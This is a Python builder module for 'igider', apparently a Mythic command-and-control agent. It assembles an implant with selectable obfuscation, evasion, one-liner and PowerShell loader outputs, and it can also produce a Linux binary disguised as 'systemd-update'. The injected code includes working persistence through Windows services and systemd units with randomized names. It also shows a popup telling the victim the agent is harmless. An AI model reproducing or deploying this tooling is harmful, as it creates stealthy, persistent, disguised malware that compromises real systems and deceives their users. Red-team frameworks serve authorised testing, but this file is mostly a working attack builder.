from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .features.obfuscation import basic_obfuscate, advanced_obfuscate
from .features.evasion import add_evasion_features
from .features.compression import compress_code, create_one_liner
import pathlib
import os
import tempfile
import base64
import json
import logging
from typing import Dict, Any
import textwrap
import tempfile
import subprocess
import sys
import re
from collections import OrderedDict

class Igider(PayloadType):

    name = "igider"
    file_extension = "py"
    author = "@med"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = False
    translation_container = "rsaTranslator"
    note = "Production-ready Python agent with advanced obfuscation and encryption features"
    supports_dynamic_loading = True
    
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="How the final payload should be structured for execution",
            choices=["py", "base64", "py_compressed", "one_liner", "bin_linux", "powershell_reflective"],
            default_value="py"
        ),
        
        BuildParameter(
            name="cryptography",
            parameter_type=BuildParameterType.ChooseOne,
            description="Apply encryption",
            choices=["Yes", "No"],
            default_value="Yes"
        ),
        BuildParameter(
            name="obfuscation_level",
            parameter_type=BuildParameterType.ChooseOne,
            description="Level of code obfuscation to apply",
            choices=["none", "basic", "advanced"],
            default_value="basic"
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate",
            choices=["Yes", "No"],
            default_value="No"
        )
    ]
    
    c2_profiles = ["http", "https"]
    
    # Use relative paths that can be configured
    _BASE_DIR = pathlib.Path(".")
    
    @property
    def agent_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "mythic"
    
    @property
    def agent_icon_path(self) -> pathlib.Path:
        return self.agent_path / "icon.svg"
    
    @property
    def agent_code_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Initializing Build", step_description="Setting up the build environment"),
        BuildStep(step_name="Gathering Components", step_description="Collecting agent code modules"),
        BuildStep(step_name="Configuring Agent", step_description="Applying configuration parameters"),
        BuildStep(step_name="Applying Obfuscation", step_description="Implementing obfuscation techniques"),
        BuildStep(step_name="Finalizing Payload", step_description="Preparing final output format")
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logger = self._setup_logger()
        
    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("igider_builder")
        logger.setLevel(logging.DEBUG)
        return logger

    @staticmethod
    def clean_code(code: str) -> str:
        lines = code.splitlines()
        import_lines = []
        body_lines = []

        # Regex to match import statements
        import_pattern = re.compile(r'^\s*(import\s+[^\n]+|from\s+\S+\s+import\s+[^\n]+)\s*$')

        for line in lines:
            if import_pattern.match(line):
                import_lines.append(line.strip())
            else:
                body_lines.append(line)

        # Deduplicate imports while preserving order
        unique_imports = list(OrderedDict.fromkeys(import_lines))

        # Final cleaned code
        cleaned_code = "\n".join(unique_imports) + "\n\n" + "\n".join(body_lines)
        return cleaned_code

    def get_file_path(self, directory: pathlib.Path, file: str) -> str:
        """Get the full path to a file, verifying its existence."""
        filename = os.path.join(directory, f"{file}.py")
        return filename if os.path.exists(filename) else ""
    
    async def update_build_step(self, step_name: str, message: str, success: bool = True) -> None:
        """Helper to update build step status in Mythic UI."""
        try:
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=step_name,
                StepStdout=message,
                StepSuccess=success
            ))
        except Exception as e:
            self.logger.error(f"Failed to update build step: {e}")

    def _load_module_content(self, module_path: str) -> str:
        """Safely load content from a module file."""
        try:
            with open(module_path, "r") as f:
                return f.read()
        except Exception as e:
            self.logger.error(f"Error loading module {module_path}: {e}")
            return ""

    def _apply_config_replacements(self, code: str, replacements: Dict[str, Any]) -> str:
        """Apply configuration replacements to code."""
        for key, value in replacements.items():
            if isinstance(value, (dict, list)):
                # Convert Python objects to JSON, then fix boolean/null values for Python syntax
                json_val = json.dumps(value).replace("false", "False").replace("true", "True").replace("null", "None")
                code = code.replace(key, json_val)
            elif value is not None:
                code = code.replace(key, str(value))
        return code
    
    def _create_powershell_loader(self, python_code: str) -> str:
        """Create PowerShell reflective loader for Python agent."""
        # Clean each line of the embedded Python code
        cleaned_python_code = '\n'.join(line.rstrip() for line in python_code.split('\n'))

        # Build the PowerShell string with exact formatting — no indent issues
        powershell_loader = (
            '# PowerShell Reflective Python Loader\n'
            '$pythonCode = @"\n'
            f'{cleaned_python_code}\n'
            '"@\n'
            '\n'
            '# Check for Python installation\n'
            '$pythonPaths = @(\n'
            '    "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",\n'
            '    "$env:PROGRAMFILES\\Python*\\python.exe",\n'
            '    "$env:PROGRAMFILES(X86)\\Python*\\python.exe",\n'
            '    "python.exe"\n'
            ')\n'
            '\n'
            '$pythonExe = $null\n'
            'foreach ($path in $pythonPaths) {\n'
            '    try {\n'
            '        $resolved = Get-Command $path -ErrorAction SilentlyContinue\n'
            '        if ($resolved) {\n'
            '            $pythonExe = $resolved.Source\n'
            '            break\n'
            '        }\n'
            '    } catch {}\n'
            '}\n'
            '\n'
            'if (-not $pythonExe) {\n'
            '    Write-Host "Python not found, attempting alternative execution..."\n'
            '    Add-Type -AssemblyName System.Net.Http\n'
            '    exit 1\n'
            '}\n'
            '\n'
            '$tempFile = [System.IO.Path]::GetTempFileName() + ".py"\n'
            '$pythonCode | Out-File -FilePath $tempFile -Encoding UTF8\n'
            '\n'
            'try {\n'
            '    & $pythonExe $tempFile\n'
            '} finally {\n'
            '    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue\n'
            '}\n'
        )

        return powershell_loader


    def _create_pyinstaller_spec(self, target_os: str) -> str:
        """Generate PyInstaller spec file for executable creation (cross-platform, no console, no icon)."""

        exe_name = "systemd-update"  # executable name
        console_mode = "False"       # no console

        # Modules to forcibly include
        hidden_imports = [
            'json',
            'ssl',
            'base64',
            'threading',
            'time',
            'urllib.request',
            'urllib.parse',
            'platform',
            'calendar',
            'datetime',
            'ipaddress',
            'locale',
            'zlib',
            'bz2',
            'lzma',
            'shutil',
            'tempfile',
            'nturl2path',
            'queue',
            'hmac',
            'ctypes',
            'signal',
            'subprocess',
            'csv',
            'pathlib',
            'zipfile',
            'textwrap',
            'ast',
            'opcode',
            'dis',
            'token',
            'tokenize',
            'linecache',
            'inspect',
            'importlib',
            'importlib.metadata',
            'importlib.resources',
            'typing',
            'pkgutil',
            'tkinter',
            'psutil',
            'cryptography',
            'cryptography.hazmat.backends',
            'cryptography.hazmat.primitives.ciphers',
            'cryptography.hazmat.primitives.ciphers.algorithms',
            'cryptography.hazmat.primitives.ciphers.modes',
            'email',
            'email.errors',
            'email.quoprimime',
            'email.base64mime',
            'email.encoders',
            'email.charset',
            'email.header',
            'email._parseaddr',
            'email.utils',
            'email._policybase',
            'email.feedparser',
            'email.parser',
            'email._encoded_words',
            'email.iterators',
            'email.message',
            'http',
            'http.client',
        ]

        hidden_imports_str = ", ".join(f"'{mod}'" for mod in hidden_imports)

        spec_content = textwrap.dedent(f"""
            # -*- mode: python ; coding: utf-8 -*-
            block_cipher = None

            a = Analysis(
                ['main.py'],
                pathex=[],
                binaries=[],
                datas=[],
                hiddenimports=[{hidden_imports_str}],
                hookspath=[],
                hooksconfig={{}},
                runtime_hooks=[],
                excludes=[],
                cipher=block_cipher,
                noarchive=False,
            )

            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

            exe = EXE(
                pyz,
                a.scripts,
                a.binaries + a.zipfiles + a.datas,
                [],
                name='{exe_name}',
                debug=False,
                bootloader_ignore_signals=False,
                strip=False,
                upx=True,
                upx_exclude=[],
                runtime_tmpdir=None,
                console={console_mode},
                disable_windowed_traceback=False,
                target_arch='x86_64',
                codesign_identity=None,
                entitlements_file=None
            )

        """)

        return spec_content




    def _build_executable(self, code: str) -> bytes:
        # Check if PyInstaller is available
        try:
            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                        capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            raise Exception("PyInstaller is not installed")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create main Python file - keep original code intact
            main_py = os.path.join(temp_dir, "main.py")
            with open(main_py, "w") as f:
                f.write(code)

            # Create a startup script that sets environment and runs main
            startup_script = os.path.join(temp_dir, "startup.py")
            with open(startup_script, "w") as f:
                f.write("""#!/usr/bin/env python3
    import os
    import sys
    import subprocess

    # Suppress fontconfig and GUI warnings
    os.environ['FONTCONFIG_PATH'] = '/dev/null'
    os.environ['FC_DEBUG'] = '0'
    os.environ['QT_LOGGING_RULES'] = '*=false'

    # Execute the main script with suppressed stderr for startup
    try:
        # Import and execute main code with warnings suppressed
        import warnings
        warnings.filterwarnings('ignore')
        
        # Temporarily suppress stderr during imports
        original_stderr = sys.stderr
        try:
            import os
            sys.stderr = open(os.devnull, 'w')
            
            # Import your main module here - this will be replaced by PyInstaller
            exec(open('main.py').read())
            
        finally:
            sys.stderr.close() if sys.stderr != original_stderr else None
            sys.stderr = original_stderr
            
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)
    """)

            # Create comprehensive fontconfig environment
            fontconfig_dir = os.path.join(temp_dir, "fontconfig")
            os.makedirs(fontconfig_dir, exist_ok=True)
            
            # Create minimal fonts.conf
            fonts_conf = os.path.join(fontconfig_dir, "fonts.conf")
            with open(fonts_conf, "w") as f:
                f.write("""<?xml version="1.0"?>
    <!DOCTYPE fontconfig SYSTEM "fonts.dtd">
    <fontconfig>
    <dir>/usr/share/fonts</dir>
    <dir>/usr/local/share/fonts</dir>
    <cachedir>/dev/null</cachedir>
    </fontconfig>""")

            # Generate and write spec file - use startup.py as entry point
            spec_content = self._create_pyinstaller_spec("linux")
            # Replace 'main.py' with 'startup.py' in spec
            spec_content = spec_content.replace("['main.py']", "['startup.py']")
            spec_content = spec_content.replace("datas=[],", "datas=[('main.py', '.')],")
            
            spec_path = os.path.join(temp_dir, "systemd-update.spec")
            with open(spec_path, "w") as f:
                f.write(spec_content)

            exe_name = "systemd-update"
            exe_path = os.path.join(temp_dir, "dist", exe_name)

            # Set comprehensive environment variables to suppress warnings
            env = os.environ.copy()
            env.update({
                "FONTCONFIG_PATH": "/dev/null",
                "FC_DEBUG": "0",
                "QT_LOGGING_RULES": "*=false",
                "PYTHONWARNINGS": "ignore",
                "PYTHONHASHSEED": "0"
            })

            # Build using spec file with suppressed output
            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--clean",
                "--log-level", "WARN",  # Reduce verbosity but show warnings
                spec_path
            ]

            try:
                self.logger.info(f"Running PyInstaller with spec: {' '.join(cmd)}")
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    cwd=temp_dir,
                    timeout=300,
                    env=env  # Use the modified environment
                )

                if result.returncode != 0:
                    # Filter out fontconfig warnings from stderr before logging
                    stderr_lines = result.stderr.split('\n')
                    filtered_stderr = '\n'.join([
                        line for line in stderr_lines 
                        if not any(keyword in line.lower() for keyword in [
                            'fontconfig warning', 'reset-dirs', 'fontconfig error'
                        ])
                    ])
                    
                    self.logger.error(f"PyInstaller stdout: {result.stdout}")
                    if filtered_stderr.strip():  # Only log if there are actual errors
                        self.logger.error(f"PyInstaller stderr: {filtered_stderr}")
                    raise Exception(f"PyInstaller failed: {filtered_stderr}")

                if not os.path.exists(exe_path):
                    raise Exception(f"Executable not found at {exe_path}")

                # Optional: log file type
                try:
                    ftype = subprocess.check_output(["file", exe_path], env=env).decode().strip()
                    self.logger.info(f"Generated executable type: {ftype}")
                except Exception:
                    pass

                with open(exe_path, "rb") as f:
                    return f.read()

            except Exception as e:
                raise Exception(f"Build failed: {str(e)}")
            
            
    async def build(self) -> BuildResponse:
        """Build the Igider payload with the specified configuration."""
        resp = BuildResponse(status=BuildStatus.Success)
        build_errors = []
        
        try:

            # Step 1: Initialize build
            await self.update_build_step("Initializing Build", "Starting build process...")
            # Step 2: Gather components
            await self.update_build_step("Gathering Components", "Loading agent modules...")
                # Load base agent code
            base_agent_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "base_agent")
            if not base_agent_path:
                build_errors.append("Base agent code not found")
                await self.update_build_step("Gathering Components", "Base agent code not found", False)
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "\n".join(build_errors)
                return resp
                
            base_code = self._load_module_content(base_agent_path)
            
            # Load appropriate crypto module
            crypto_method = self.get_parameter("cryptography")
            if crypto_method == "Yes":
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib")
                if not crypto_path:
                    build_errors.append(f"Crypto module '{crypto_method}' not found")
                    crypto_code = "# Error loading crypto module"
                else:
                    crypto_code = self._load_module_content(crypto_path)
            else:
                crypto_code = ""
            ###############################################################################################
                # Load command modules
            command_code = ""
            selected_os = self.selected_os.lower()
            platform_specific_cmds=["priv_esc"]
            for cmd in self.commands.get_commands():
                if cmd in platform_specific_cmds:     
                    if selected_os == "windows":
                        platform_dir = self.agent_code_path / "windows"

                    elif selected_os == "linux":
                        platform_dir = self.agent_code_path / "linux"
                else:
                    platform_dir = self.agent_code_path  
                command_path = self.get_file_path(platform_dir,cmd)
                if not command_path:
                    build_errors.append(f"Command module '{cmd}' not found in any location")
                else:
                    command_code += self._load_module_content(command_path) + "\n"

            command_code += (r"""
    import tkinter 
    def show_console_popup(self, duration=5000):
        msg = (
            "IGIDER Agent is now running in the background." + 
            "Monitoring system vulnerabilities and testing in progress." +
            "   You can safely continue your work."
        )


        root = tkinter.Tk()
        root.overrideredirect(True)          
        root.attributes("-topmost", True)   
        root.configure(bg="#0f0f1f")        

        width, height = 450, 150
        x = (root.winfo_screenwidth() - width) // 2
        y = (root.winfo_screenheight() - height) // 2
        root.geometry(f"{width}x{height}+{x}+{y}")

        frame = tkinter.Frame(root, bg="#0f0f1f", bd=3, relief="ridge")
        frame.pack(fill="both", expand=True)

        label = tkinter.Label(
            frame,
            text=msg,
            font=("Consolas", 12, "bold"),
            fg="#00ff99",              
            bg="#0f0f1f",
            justify="center",
            wraplength=400
        )
        label.pack(expand=True, padx=20, pady=20)
        root.after(duration, root.destroy)
        root.mainloop()

                                """)
            if selected_os == "windows":
                command_code +=(r"""
    def create_persistence(self):
        try:
            svc_name = dec(b'<base64_encoded_obf_svc_name>') + str(random.randint(1000, 9999))  # Randomized name
            try:
                subprocess.check_output(f"sc query {svc_name}", shell=True)
                return  
            except subprocess.CalledProcessError:
                pass  
            
            cmd = f'sc create {svc_name} binpath= "{sys.executable} {__file__}" start= auto'
            subprocess.check_output(cmd, shell=True)
            subprocess.check_output(f'sc start {svc_name}', shell=True)
        except Exception as e:
            pass

                                """)
            else:
                command_code += f"""
    import os, random, subprocess, sys

    def create_persistence(self):
        try:
            svc_name = "svc" + str(random.randint(1000, 9999))  # randomized service name
            service_file = f"/etc/systemd/system/{{svc_name}}.service"

            # Check if service already exists
            if os.path.exists(service_file):
                return  

            # Create systemd service content
            service_content = f\"\"\"[Unit]
    Description=Persistence Service {{svc_name}}

    [Service]
    ExecStart={{sys.executable}} {{os.path.abspath(__file__)}}
    Restart=always

    [Install]
    WantedBy=multi-user.target
    \"\"\"

            # Write service file
            with open(service_file, "w") as f:
                f.write(service_content)

            # Enable and start service
            subprocess.run(["systemctl", "enable", svc_name], check=False)
            subprocess.run(["systemctl", "start", svc_name], check=False)

        except Exception:
            pass
                """


            
            # Step 3: Configure agent
            await self.update_build_step("Configuring Agent", "Applying agent configuration...")
            
                # Replace placeholders with actual code/config
            base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
            # if selected_os == "linux":
            #     base_code = base_code.replace("#linux_error", """sys.stderr = open(os.devnull, 'w')""")
            
                # Process C2 profile configuration
            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]
                base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
            
            # Configure HTTPS certificate validation
            if self.get_parameter("https_check") == "Yes":
                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                base_code = base_code.replace("#CERTSKIP", 
                """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n""")
            else:
                base_code = base_code.replace("#CERTSKIP", "")
                
            #base_code = self.clean_code(base_code)  
            
            # Step 4: Apply obfuscation
            await self.update_build_step("Applying Obfuscation", "Implementing code obfuscation...")
                # Add evasion features first
            base_code = add_evasion_features(base_code,selected_os)
            base_code = self.clean_code(base_code)
            cl_code=base_code 

                # Apply obfuscation based on selected level
            obfuscation_level = self.get_parameter("obfuscation_level")
            if obfuscation_level == "advanced":
                base_code = advanced_obfuscate(base_code)
                await self.update_build_step("Applying Obfuscation", "Advanced obfuscation applied successfully")
            elif obfuscation_level == "basic":
                base_code = basic_obfuscate(base_code)
                await self.update_build_step("Applying Obfuscation", "Basic obfuscation applied successfully")
            else:  # none
                await self.update_build_step("Applying Obfuscation", "No obfuscation requested, skipping")
            
            # Step 5: Finalize payload format
            await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
            
            output_format = self.get_parameter("output")

            if output_format == "base64":
                resp.payload = base64.b64encode(base_code.encode())
                resp.build_message = "Successfully built payload in base64 format"

            elif output_format == "py_compressed":
                compressed_code = compress_code(base_code)
                resp.payload = compressed_code.encode()
                resp.build_message = "Successfully built compressed Python payload"

            elif output_format == "one_liner":
                one_liner = create_one_liner(base_code)
                resp.payload = one_liner.encode()
                resp.build_message = "Successfully built one-liner payload"

            elif output_format == "bin_linux":
                try:
                    resp.build_message = "Building Linux executable..."
                    await self.update_build_step("Finalizing Payload", "Building Linux executable...")
                    executable_data = self._build_executable(base_code)
                    resp.payload = executable_data
                    resp.updated_filename = (self.filename).split(".")[0] +".bin"
                    resp.build_message = "Successfully built Linux executable"
                except Exception as e:
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = f"Failed to build Linux executable: {str(e)} * {self.filename} * {output_format}"
                    return resp
                
            elif output_format == "powershell_reflective":
                try:
                    await self.update_build_step("Finalizing Payload", "Creating PowerShell reflective loader...")
                    ps_loader = self._create_powershell_loader(base_code)
                    resp.payload = ps_loader.encode()
                    resp.updated_filename = (self.filename).split(".")[0] +".ps1"
                    resp.build_message = "Successfully built PowerShell reflective loader"
                except Exception as e:
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = f"Failed to build PowerShell loader: {str(e)}"
                    return resp
                
            else:  # default to py
                resp.payload = base_code.encode()
                resp.build_message = "Successfully built Python script payload"
            
            # Report any non-fatal errors
            if build_errors:
                resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
            

        except Exception as e:
            self.logger.error(f"Build failed: {str(e)}")
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = f"Error building payload: {str(e)}"
            await self.update_build_step("Finalizing Payload", f"Build failed: {str(e)}", False)
            
        return resp